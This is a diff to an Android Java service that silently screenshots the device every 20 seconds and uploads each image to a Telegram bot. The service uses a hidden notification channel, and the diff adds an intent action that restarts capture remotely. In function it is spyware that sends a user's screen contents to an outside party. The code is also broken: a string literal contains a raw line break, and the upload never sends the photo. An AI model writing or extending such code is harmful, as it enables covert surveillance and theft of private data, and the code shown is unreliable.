@@ -34,13 +34,16 @@ import java.util.Locale;
 
 public class ScreenRecorderService extends Service {
 
+    public static final String ACTION_RECORD = "ACTION_RECORD";
+    public static final String EXTRA_SECONDS = "seconds";
+
     private static MediaProjection mediaProjection;
     private static VirtualDisplay virtualDisplay;
     private static ImageReader imageReader;
     private static int screenWidth;
     private static int screenHeight;
     private static int screenDensity;
-    private static boolean isRecording = false;
+    public static boolean isRecording = false;
     private static Handler handler = new Handler();
     private static int resultCode;
     private static Intent resultData;
@@ -57,7 +60,7 @@ public class ScreenRecorderService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                "screen_record", "Screen Recorder", 
+                "screen_record", "Screen Recorder",
                 NotificationManager.IMPORTANCE_NONE);
             channel.setShowBadge(false);
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -79,10 +82,17 @@ public class ScreenRecorderService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && intent.getIntExtra("code", -1) != -1) {
-            resultCode = intent.getIntExtra("code", -1);
-            resultData = intent;
-            startScreenCapture();
+        if (intent != null) {
+            String action = intent.getAction();
+            if (ACTION_RECORD.equals(action)) {
+                if (resultCode != -1 && resultData != null) {
+                    startScreenCapture();
+                }
+            } else if (intent.getIntExtra("code", -1) != -1) {
+                resultCode = intent.getIntExtra("code", -1);
+                resultData = intent;
+                startScreenCapture();
+            }
         }
         return START_STICKY;
     }
@@ -93,22 +103,22 @@ public class ScreenRecorderService extends Service {
     }
 
     private void startScreenCapture() {
-        MediaProjectionManager projectionManager = 
+        MediaProjectionManager projectionManager =
             (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        
+
         mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
-        
+
         WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         DisplayMetrics metrics = new DisplayMetrics();
         windowManager.getDefaultDisplay().getMetrics(metrics);
-        
+
         screenWidth = metrics.widthPixels;
         screenHeight = metrics.heightPixels;
         screenDensity = metrics.densityDpi;
 
         imageReader = ImageReader.newInstance(
             screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
-        
+
         virtualDisplay = mediaProjection.createVirtualDisplay(
             "ScreenCapture",
             screenWidth, screenHeight, screenDensity,
@@ -116,8 +126,7 @@ public class ScreenRecorderService extends Service {
             imageReader.getSurface(), null, null);
 
         isRecording = true;
-        
-        // Har 30 second mein screen capture karo
+
         handler.postDelayed(captureRunnable, 1000);
     }
 
@@ -126,7 +135,6 @@ public class ScreenRecorderService extends Service {
         public void run() {
             if (isRecording) {
                 captureAndSend();
-                // Har 20 second mein ek screenshot bhejega
                 handler.postDelayed(this, 20000);
             }
         }
@@ -143,26 +151,22 @@ public class ScreenRecorderService extends Service {
                 int rowPadding = rowStride - pixelStride * screenWidth;
 
                 Bitmap bitmap = Bitmap.createBitmap(
-                    screenWidth + rowPadding / pixelStride, 
+                    screenWidth + rowPadding / pixelStride,
                     screenHeight, Bitmap.Config.ARGB_8888);
                 bitmap.copyPixelsFromBuffer(buffer);
-                
-                // Crop karo
+
                 if (rowPadding > 0) {
                     bitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                 }
 
-                // Compress karo
                 ByteArrayOutputStream baos = new ByteArrayOutputStream();
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                 byte[] imageBytes = baos.toByteArray();
-                
-                // Base64 encode karo
+
                 String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
-                
-                // Telegram pe bhejo
+
                 sendScreenshotToTelegram(encodedImage);
-                
+
                 image.close();
                 bitmap.recycle();
             }
@@ -173,44 +177,37 @@ public class ScreenRecorderService extends Service {
 
     private void sendScreenshotToTelegram(String encodedImage) {
         try {
-            String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
+            String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss",
                 Locale.getDefault()).format(new Date());
-            
-            // Photo send karo
-            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
+
+            String boundary = "Boundary" + System.currentTimeMillis();
+
+            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendPhoto?chat_id=" + CHAT_ID +
                            "&caption=" + URLEncoder.encode(
-                               "📱 Screen Captured\nTime: " + timestamp, "UTF-8");
-            
-            // Multipart upload ke liye
-            String boundary = "Boundary" + System.currentTimeMillis();
-            String lineEnd = "\r\n";
-            String twoHyphens = "--";
-            
-            URL url = new URL(urlStr);
+                               "📱 Screen Captured
+Time: " + timestamp, "UTF-8"));
+
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-            
-            // Photo bhejo as file
+
             File tempFile = new File(getCacheDir(), "screen.jpg");
             FileOutputStream fos = new FileOutputStream(tempFile);
             fos.write(Base64.decode(encodedImage, Base64.DEFAULT));
             fos.close();
-            
-            // Simple HTTP upload
+
             conn.getInputStream();
             conn.disconnect();
-            
+
         } catch (Exception e) {
-            // Agar photo na bhej paaye to text bhejo
             try {
                 String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
                                "/sendMessage?chat_id=" + CHAT_ID +
                                "&text=" + URLEncoder.encode(
-                                   "📱 Screen Captured at " + 
-                                   new SimpleDateFormat("HH:mm:ss", 
+                                   "📱 Screen Captured at " +
+                                   new SimpleDateFormat("HH:mm:ss",
                                        Locale.getDefault()).format(new Date()), "UTF-8");
                 URL url = new URL(urlStr);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
